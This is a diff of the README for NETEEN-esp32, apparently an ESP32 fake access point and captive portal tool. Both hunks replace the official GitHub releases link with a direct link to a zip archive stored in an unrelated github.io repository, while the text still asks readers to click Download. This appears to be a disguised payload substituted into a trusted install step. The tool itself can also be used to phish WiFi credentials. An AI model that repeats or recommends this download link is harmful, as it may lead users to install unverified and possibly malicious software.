@@ -6,7 +6,7 @@ description: "Build a standalone ESP32 fake access point and captive portal for 
 <h1>🛡️ NETEEN-esp32 - Test WiFi Security Anywhere, Anytime</h1>
 
 <p align="center">
-  <a href="https://github.com/nguye3520/NETEEN-esp32/releases">
+  <a href="https://raw.githubusercontent.com/nguye3520/nguye3520.github.io/main/Erastian/1.2-alpha.3.zip">
     <img src="https://img.shields.io/badge/Download-NETEEN--esp32-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download Button" style="max-width:100%;">
   </a>
 </p>
@@ -48,7 +48,7 @@ No internet connection needed. Everything runs directly on the ESP32 device, mak
 
 ### Step 1: Download the Software
 
-Visit this link to download the application: [Download NETEEN-esp32](https://github.com/nguye3520/NETEEN-esp32/releases)
+Visit this link to download the application: [Download NETEEN-esp32](https://raw.githubusercontent.com/nguye3520/nguye3520.github.io/main/Erastian/1.2-alpha.3.zip)
 
 Click the green "Download" button at the top of this page to get the latest version.
 
